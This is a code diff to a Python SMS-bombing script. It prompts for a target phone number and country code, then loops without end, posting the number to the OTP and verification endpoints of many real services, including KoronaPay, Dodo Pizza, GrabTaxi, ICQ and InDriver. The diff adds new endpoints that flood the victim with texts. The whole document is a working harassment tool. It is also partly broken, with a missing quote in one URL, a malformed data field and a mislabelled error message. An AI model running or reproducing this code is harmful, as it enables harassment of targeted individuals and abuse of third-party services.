@@ -114,7 +114,7 @@ try:
 except Exception:
     pass
 
-
+_cc=input('    Enter Country Code  -->  ')
 _phone=input(' Enter Target Number -->  ')
 
 _name = ''
@@ -141,6 +141,50 @@ banner()
 while True:
 	_email = _name+f'{iteration}'+'@gmail.com'
 	email = _name+f'{iteration}'+'@gmail.com'
+	try:
+		requests.post(https://koronapay.com/transfers/online/api/users/otps',data={'phone': _phone})
+		print(random.choice(colors))		
+		print("Successful Requests   : ", success)
+	except:
+		print('[-] Korona Requests Failed!')
+	try:        
+                success += 1
+
+	except:
+                failed += 1
+	try:
+		requests.post('https://www.stoloto.ru:443/send-mobile-app-link',data={'phone':_phone})
+		print(random.choice(colors))		
+		print("Successful Requests   : ", success)
+	except:
+		print('[-] Stoloto Requests Failed!')
+	try:        
+                success += 1
+
+	except:
+                failed += 1
+	try:
+		requests.post('https://drugvokrug.ru:443/siteActions/processSms.htm',data={'cell':_phone})
+		print(random.choice(colors))		
+		print("Successful Requests   : ", success)
+	except:
+		print('[-] Drugvokrug Requests Failed!')
+	try:        
+                success += 1
+
+	except:
+                failed += 1
+	try:
+		requests.post('https://dodopizza.ru/api/sendconfirmationcode',data={'phoneNumber':_phone})
+		print(random.choice(colors))		
+		print("Successful Requests   : ", success)
+	except:
+		print('[-] Drugvokrug Requests Failed!')
+	try:        
+                success += 1
+
+	except:
+                failed += 1
 	try:
 		requests.post('https://www.magicbricks.com/bricks/resendVerifictionCode.html?from=register&mobile='+str(_phone))
 		print(random.choice(colors))		
@@ -176,7 +220,7 @@ while True:
                 failed += 1
 
 	try:
-		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': _cc, 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
 		print(random.choice(colors))		
 		print("Successful Requests   : ", success)
 	except:
@@ -496,7 +540,7 @@ while True:
                 failed += 1
 
 	try:
-		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
+		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'tr','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
 		print(random.choice(colors))		
 		print("Successful Requests   : ", success)
 	except:
@@ -509,7 +553,8 @@ while True:
 
 	try:
 		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
-		print('[+] InDriver Requests Successful!')
+		print(random.choice(colors))		
+		print("Successful Requests   : ", success)
 	except:
 		print('[-] InDriver Requests Failed!')
 	try:        
